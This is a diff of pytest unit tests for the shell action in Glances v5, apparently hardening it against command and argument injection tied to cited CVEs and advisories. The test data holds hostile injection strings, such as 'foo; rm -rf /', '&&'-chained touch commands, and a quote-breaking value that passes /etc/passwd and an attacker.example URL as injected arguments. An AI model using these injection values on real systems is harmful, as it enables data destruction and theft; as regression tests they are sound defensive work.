@@ -7,14 +7,21 @@
 # SPDX-License-Identifier: LGPL-3.0-only
 #
 
-"""Glances v5 — unit tests for the shell `GlancesActionBase` subclass."""
+"""Glances v5 — unit tests for the shell `GlancesActionBase` subclass.
+
+The assertions bear on the argv handed to `Popen`, never on an intermediate
+rendered string: the string `secure_popen` receives is the trusted template,
+the untrusted values are expanded per argument further down
+(GHSA-56xw-p9qm-r437). A string-level assertion would pass for the wrong
+reason.
+"""
 
 from __future__ import annotations
 
-import asyncio
 import logging
-from unittest.mock import AsyncMock, patch
+from unittest.mock import MagicMock, patch
 
+import chevron
 import pytest
 
 from glances.actions_v5.shell import ShellAction
@@ -23,12 +30,30 @@ from glances.actions_v5.shell import ShellAction
 
 
 class _FakeProcess:
-    def __init__(self, returncode: int = 0, stderr: bytes = b"") -> None:
-        self.returncode = returncode
-        self._stderr = stderr
+    """Minimal Popen stand-in: no output, no exit status."""
 
-    async def communicate(self) -> tuple[bytes, bytes]:
-        return (b"", self._stderr)
+    def __init__(self) -> None:
+        self.stdout = MagicMock()
+
+    def communicate(self, timeout=None) -> tuple[bytes, bytes]:
+        return (b"", b"")
+
+    def wait(self, timeout=None) -> int:
+        return 0
+
+
+async def _capture_argv(action, plugin_name, level, context, template, repeat=False):
+    """Run the action and return the argv of every process that was spawned."""
+    argv_list = []
+
+    def fake_popen(argv, **kwargs):
+        argv_list.append(argv)
+        return _FakeProcess()
+
+    with patch("glances.secure.Popen", side_effect=fake_popen):
+        await action.execute(plugin_name, level, context, template, repeat=repeat)
+
+    return argv_list
 
 
 @pytest.fixture
@@ -51,135 +76,92 @@ def test_is_available_true(shell_action):
 
 
 async def test_renders_simple_template_and_executes(shell_action):
-    fake_proc = _FakeProcess(returncode=0)
-    with patch(
-        "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-        new=AsyncMock(return_value=fake_proc),
-    ) as mock_exec:
-        await shell_action.execute("mem", "warning", {"percent": 75.0}, "echo {{percent}}", repeat=False)
-    mock_exec.assert_awaited_once()
-    # Shell command is the first positional arg.
-    rendered_command = mock_exec.await_args.args[0]
-    assert rendered_command == "echo 75.0"
+    argv_list = await _capture_argv(shell_action, "mem", "warning", {"percent": 75.0}, "echo {{percent}}")
+    assert argv_list == [["echo", "75.0"]]
 
 
 async def test_builtin_variables_substituted(shell_action):
-    fake_proc = _FakeProcess()
-    with patch(
-        "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-        new=AsyncMock(return_value=fake_proc),
-    ) as mock_exec:
-        await shell_action.execute(
-            "mem",
-            "critical",
-            {
-                "percent": 95.0,
-                "_glances_hostname": "myhost",
-                "_glances_plugin": "mem",
-                "_glances_level": "critical",
-                "_glances_timestamp": "2026-05-11T10:00:00+00:00",
-            },
-            "logger glances-{{_glances_plugin}}-{{_glances_level}}: {{percent}}",
-        )
-    cmd = mock_exec.await_args.args[0]
-    assert cmd == "logger glances-mem-critical: 95.0"
+    argv_list = await _capture_argv(
+        shell_action,
+        "mem",
+        "critical",
+        {
+            "percent": 95.0,
+            "_glances_hostname": "myhost",
+            "_glances_plugin": "mem",
+            "_glances_level": "critical",
+            "_glances_timestamp": "2026-05-11T10:00:00+00:00",
+        },
+        "logger glances-{{_glances_plugin}}-{{_glances_level}}: {{percent}}",
+    )
+    assert argv_list == [["logger", "glances-mem-critical:", "95.0"]]
 
 
-async def test_shell_metacharacters_are_quoted_to_defeat_injection(shell_action):
-    """Malicious metric value cannot break out of the shell context (CVE-2026-32608)."""
-    fake_proc = _FakeProcess()
+async def test_shell_metacharacters_cannot_start_a_command(shell_action):
+    """A malicious metric value cannot break out of its argument (CVE-2026-32608).
+
+    `secure_popen` splits the template before the value exists, so the `;`
+    never reaches a lexer that would treat it as a separator.
+    """
     malicious = "foo; rm -rf /"
-    with patch(
-        "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-        new=AsyncMock(return_value=fake_proc),
-    ) as mock_exec:
-        await shell_action.execute(
-            "containers",
-            "critical",
-            {"name": malicious},
-            "logger {{name}}",
-        )
-    cmd = mock_exec.await_args.args[0]
-    # shlex.quote wraps it in single quotes — the `;` cannot start a new command.
-    assert "'foo; rm -rf /'" in cmd
-    assert cmd.startswith("logger ")
+    argv_list = await _capture_argv(shell_action, "containers", "critical", {"name": malicious}, "logger {{name}}")
+    assert argv_list == [["logger", malicious]]
 
 
-async def test_nested_list_value_reaches_shell_as_single_token(shell_action, tmp_path):
+async def test_nested_list_value_reaches_one_argument(shell_action):
     """A nested (list) context value cannot smuggle a shell operator.
 
     v4 fixed this by recursing its operator-stripping sanitizer into lists
-    (GHSA-73wf-9vmv-5pv9). v5 uses a different mechanism — `shlex.quote(str(v))`
-    quotes the whole stringified list as one token — so the class of bypass
-    cannot occur. This locks that property in.
+    (GHSA-73wf-9vmv-5pv9). Splitting before rendering makes the whole class
+    impossible: the stringified list is a single argument whatever it holds.
     """
-    sentinel = tmp_path / "pwned"
     # `cmdline` is the argv list an attacker can set on their own process.
-    malicious_cmdline = ["python", "-c", f"x && touch {sentinel}"]
-    with patch(
-        "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-        new=AsyncMock(return_value=_FakeProcess()),
-    ) as mock_exec:
-        await shell_action.execute("processlist", "warning", {"cmdline": malicious_cmdline}, "logger {{cmdline}}")
-    cmd = mock_exec.await_args.args[0]
-    # Actually run the rendered command line; the `&&` must stay inside the
-    # single-quoted token and never chain a second command.
-    proc = await asyncio.create_subprocess_shell(
-        cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
+    argv_list = await _capture_argv(
+        shell_action,
+        "processlist",
+        "warning",
+        {"cmdline": ["python", "-c", "x && touch /tmp/pwned"]},
+        "logger {{cmdline}}",
     )
-    await proc.communicate()
-    assert not sentinel.exists()
+    assert len(argv_list) == 1
+    assert len(argv_list[0]) == 2
+    assert "touch /tmp/pwned" in argv_list[0][1]
 
 
-async def test_adjacent_unescaped_variables_cannot_reconstruct_operator(shell_action, tmp_path):
-    """Two adjacent variables whose values touch cannot form `&&`.
+async def test_adjacent_unescaped_variables_cannot_reconstruct_operator(shell_action):
+    """Two adjacent variables whose values touch cannot form a real `&&`.
 
     v4 added a lone `&` to its operator blocklist because per-field
-    sanitization left `{{{a}}}{{{b}}}` able to join a trailing and leading `&`
-    into a real `&&` across the boundary (GHSA-qcpp-8x79-hhp3). v5's
-    `shlex.quote` closes/opens a quote at every boundary, so the joined text is
-    a single literal word. Uses triple braces (unescaped) — the worst case.
+    sanitization left `{{{a}}}{{{b}}}` able to join a trailing and a leading
+    `&` across the boundary (GHSA-qcpp-8x79-hhp3). Here the `&&` is
+    reconstructed, but only inside an argument that was already delimited, so
+    it is inert. Uses triple braces (unescaped) — the worst case.
     """
-    sentinel = tmp_path / "pwned"
-    with patch(
-        "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-        new=AsyncMock(return_value=_FakeProcess()),
-    ) as mock_exec:
-        await shell_action.execute(
-            "processlist",
-            "warning",
-            {"a": "foo&", "b": f"&touch {sentinel} #"},
-            "logger {{{a}}}{{{b}}}",
-        )
-    cmd = mock_exec.await_args.args[0]
-    proc = await asyncio.create_subprocess_shell(
-        cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
+    argv_list = await _capture_argv(
+        shell_action,
+        "processlist",
+        "warning",
+        {"a": "foo&", "b": "&touch /tmp/pwned #"},
+        "logger {{{a}}}{{{b}}}",
     )
-    await proc.communicate()
-    assert not sentinel.exists()
+    # A single process, and both values in the same single argument
+    assert argv_list == [["logger", "foo&&touch /tmp/pwned #"]]
 
 
-async def test_returncode_non_zero_is_logged(shell_action, caplog):
-    fake_proc = _FakeProcess(returncode=2, stderr=b"command not found")
-    with (
-        patch(
-            "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-            new=AsyncMock(return_value=fake_proc),
-        ),
-        caplog.at_level(logging.WARNING),
-    ):
-        await shell_action.execute("mem", "warning", {}, "false")
-    assert "non-zero exit" in caplog.text
-    assert "returncode=2" in caplog.text
+async def test_result_is_logged_at_debug(shell_action, caplog):
+    """`secure_popen` does not expose the return code, so the command output
+    (or its stderr) is what gets logged, at debug level."""
+    with caplog.at_level(logging.DEBUG, logger="glances.actions_v5.shell"):
+        await shell_action.execute("mem", "warning", {}, "echo -n RESULT", repeat=True)
+    assert "RESULT" in caplog.text
+    # `repeat` is carried in that same line
+    assert "repeat=True" in caplog.text
 
 
 async def test_subprocess_exception_is_logged_not_raised(shell_action, caplog):
     """OSError during subprocess startup is captured, not propagated."""
     with (
-        patch(
-            "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-            new=AsyncMock(side_effect=OSError("fork failed")),
-        ),
+        patch("glances.secure.Popen", side_effect=OSError("fork failed")),
         caplog.at_level(logging.WARNING),
     ):
         await shell_action.execute("mem", "warning", {}, "some-cmd")
@@ -187,52 +169,134 @@ async def test_subprocess_exception_is_logged_not_raised(shell_action, caplog):
 
 
 async def test_template_render_error_is_logged_and_skips_exec(shell_action, caplog):
-    """A malformed template logs a warning and never invokes the subprocess."""
-    with (
-        patch(
-            "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-            new=AsyncMock(),
-        ) as mock_exec,
-        patch("glances.actions_v5.shell.chevron.render", side_effect=ValueError("bad template")),
-        caplog.at_level(logging.WARNING),
-    ):
-        await shell_action.execute("mem", "warning", {}, "echo {{percent}}")
-    mock_exec.assert_not_awaited()
+    """A Mustache section spanning two arguments cannot be rendered per
+    argument: log a warning and never spawn anything."""
+    argv_list = []
+    with caplog.at_level(logging.WARNING):
+        argv_list = await _capture_argv(
+            shell_action,
+            "processlist",
+            "warning",
+            {"cmdline": ["x", "y"]},
+            "logger {{#cmdline}}{{.}} {{/cmdline}}",
+        )
+    assert argv_list == []
     assert "template render failed" in caplog.text
+
+
+async def test_section_within_one_argument_is_rendered(shell_action):
+    """A section that opens and closes inside the same argument still works."""
+    argv_list = await _capture_argv(
+        shell_action,
+        "processlist",
+        "warning",
+        {"cmdline": ["a b", "c'd"]},
+        "logger {{#cmdline}}{{.}},{{/cmdline}}",
+    )
+    assert argv_list == [["logger", "a b,c'd,"]]
+
+
+# --------------------------------------------- argument / command injection
+#
+# GHSA-56xw-p9qm-r437 (CWE-88) in v4, plus the v5-only CWE-78 variant: v5 used
+# to pre-quote the values with shlex.quote() and hand the result to a real
+# shell, but chevron's default {{var}} syntax HTML-escapes `" < > &` and so
+# rewrote the very quotes shlex.quote had emitted, leaving live `&` operators
+# in the command line. Splitting before rendering removes both.
+
+_POC_VALUE = "/mnt/usb/x' --evil-flag /etc/passwd http://attacker.example/leak 'y"
+
+
+async def test_poc_single_quoted_field_stays_one_argument(shell_action):
+    argv_list = await _capture_argv(
+        shell_action,
+        "fs",
+        "critical",
+        {"mnt_point": _POC_VALUE, "percent": "92"},
+        "argv_logger.py '{{mnt_point}}' {{percent}}",
+    )
+    assert argv_list == [["argv_logger.py", _POC_VALUE, "92"]]
+
+
+async def test_unquoted_field_with_spaces_stays_one_argument(shell_action):
+    """The pattern documented in docs/aoa/actions.rst is unquoted, and a plain
+    space in the value was enough to inject argv tokens."""
+    value = "/mnt/x --evil-flag /etc/passwd"
+    argv_list = await _capture_argv(
+        shell_action,
+        "fs",
+        "critical",
+        {"mnt_point": value, "percent": "92"},
+        "argv_logger.py {{mnt_point}} {{percent}}",
+    )
+    assert argv_list == [["argv_logger.py", value, "92"]]
+
+
+async def test_triple_mustache_stays_one_argument(shell_action):
+    argv_list = await _capture_argv(
+        shell_action,
+        "fs",
+        "critical",
+        {"mnt_point": _POC_VALUE, "percent": "92"},
+        "argv_logger.py {{{mnt_point}}} {{percent}}",
+    )
+    assert argv_list == [["argv_logger.py", _POC_VALUE, "92"]]
+
+
+async def test_empty_value_yields_an_empty_argument(shell_action):
+    """An empty field keeps its argv slot, so emptying a value cannot shift the
+    positional arguments of the invoked script."""
+    argv_list = await _capture_argv(
+        shell_action,
+        "fs",
+        "critical",
+        {"mnt_point": "", "percent": "92"},
+        "argv_logger.py {{mnt_point}} {{percent}}",
+    )
+    assert argv_list == [["argv_logger.py", "", "92"]]
+
+
+@pytest.mark.parametrize(
+    "template",
+    [
+        "echo {{mnt_point}}",  # documented, unquoted
+        'echo "{{mnt_point}}"',  # the shipped conf/glances.conf examples
+        "echo {{{mnt_point}}}",  # raw form
+    ],
+)
+async def test_value_cannot_execute_a_second_command(shell_action, tmp_path, template):
+    """End-to-end: no mock, a real process. The injected command must not run.
+
+    This is the v5-only CWE-78 variant — with the previous implementation the
+    unquoted case created the sentinel.
+    """
+    sentinel = tmp_path / "pwned"
+    await shell_action.execute("fs", "critical", {"mnt_point": f"x' ; touch {sentinel} ; '"}, template)
+    assert not sentinel.exists()
 
 
 # ------------------------------------------------- --disable-config-exec
 #
 # CVE-2026-68519: the hardening flag must cover the on-alert action commands,
-# which are read from the same glances.conf as the AMP commands. The injection
-# vector is already closed by shlex.quote(); what the flag adds is that the
-# operator's OWN config line can no longer chain, pipe or redirect.
+# which are read from the same glances.conf as the AMP commands. What the flag
+# adds is that the operator's OWN config line can no longer chain, pipe or
+# redirect.
 
 
 def test_default_config_exec_is_allowed(shell_action):
-    """Conservative default: no config, no flag -> shell execution as before."""
-    assert shell_action.allow_shell() is True
+    """Conservative default: no config, no flag -> operators interpreted."""
+    assert shell_action.allow_operators() is True
 
 
-def test_flag_disables_shell(config_with):
+def test_flag_disables_operators(config_with):
     action = ShellAction(config_with({"global": {"disable_config_exec": "true"}}))
-    assert action.allow_shell() is False
+    assert action.allow_operators() is False
 
 
-async def test_disabled_runs_without_a_shell(config_with):
+async def test_disabled_runs_as_a_single_process(config_with):
     action = ShellAction(config_with({"global": {"disable_config_exec": "true"}}))
-    with (
-        patch(
-            "glances.actions_v5.shell.asyncio.create_subprocess_exec",
-            new=AsyncMock(return_value=_FakeProcess()),
-        ) as mock_exec,
-        patch("glances.actions_v5.shell.asyncio.create_subprocess_shell", new=AsyncMock()) as mock_shell,
-    ):
-        await action.execute("mem", "warning", {"percent": 75.0}, "echo {{percent}}")
-    mock_shell.assert_not_awaited()
-    mock_exec.assert_awaited_once()
-    # argv form: the template is split into a single process' arguments.
-    assert list(mock_exec.await_args.args) == ["echo", "75.0"]
+    argv_list = await _capture_argv(action, "mem", "warning", {"percent": 75.0}, "echo {{percent}}")
+    assert argv_list == [["echo", "75.0"]]
 
 
 async def test_disabled_makes_operators_literal(config_with, tmp_path):
@@ -247,36 +311,33 @@ async def test_enabled_still_interprets_operators(config_with, tmp_path):
     """Non-regression: the default behaviour is unchanged."""
     sentinel = tmp_path / "written"
     action = ShellAction(config_with({"global": {}}))
-    await action.execute("mem", "warning", {}, f"echo hello > {sentinel}")
+    await action.execute("mem", "warning", {"name": "disk 1"}, f"echo -n {{{{name}}}} > {sentinel}")
     assert sentinel.exists()
+    # …and the templated value reaches the file whole, spaces included
+    assert sentinel.read_text() == "disk 1"
 
 
-async def test_disabled_unsplittable_command_is_logged_and_skipped(config_with, caplog):
-    """An unbalanced quote makes shlex.split raise — log, never execute."""
+async def test_enabled_still_pipes(config_with):
+    action = ShellAction(config_with({"global": {}}))
+    argv_list = await _capture_argv(action, "mem", "warning", {"n": "foo bar"}, "echo {{n}} | grep {{n}}")
+    assert argv_list == [["echo", "foo bar"], ["grep", "foo bar"]]
+
+
+async def test_protection_holds_with_disable_config_exec(config_with):
+    """The hardened path uses the same tokenizer and must be protected too."""
     action = ShellAction(config_with({"global": {"disable_config_exec": "true"}}))
-    with (
-        patch("glances.actions_v5.shell.asyncio.create_subprocess_exec", new=AsyncMock()) as mock_exec,
-        caplog.at_level(logging.WARNING),
-    ):
-        await action.execute("mem", "warning", {}, "echo 'unbalanced")
-    mock_exec.assert_not_awaited()
-    assert "cannot be split" in caplog.text
+    argv_list = await _capture_argv(
+        action,
+        "fs",
+        "critical",
+        {"mnt_point": _POC_VALUE, "percent": "92"},
+        "argv_logger.py '{{mnt_point}}' {{percent}}",
+    )
+    assert argv_list == [["argv_logger.py", _POC_VALUE, "92"]]
 
 
-async def test_repeat_flag_passed_through(shell_action):
-    """`repeat=True` is honoured by the action signature (logged on failure)."""
-    fake_proc = _FakeProcess(returncode=1, stderr=b"oops")
-    with (
-        patch(
-            "glances.actions_v5.shell.asyncio.create_subprocess_shell",
-            new=AsyncMock(return_value=fake_proc),
-        ),
-        # Use caplog to inspect the log line which carries repeat= info.
-        patch("glances.actions_v5.shell.logger") as mock_logger,
-    ):
-        await shell_action.execute("mem", "warning", {}, "false", repeat=True)
-    # repeat=True must appear in the warning args of the non-zero-exit log line.
-    mock_logger.warning.assert_called_once()
-    args = mock_logger.warning.call_args.args
-    # The format string positional args include repeat — check it's True somewhere.
-    assert True in args
+def test_chevron_error_is_the_caught_template_error():
+    """Guard the `except chevron.ChevronError` clause: chevron raises that type
+    for a tag left unclosed inside an argument."""
+    with pytest.raises(chevron.ChevronError):
+        chevron.render("{{#section}}{{.}}", {"section": ["x"]})
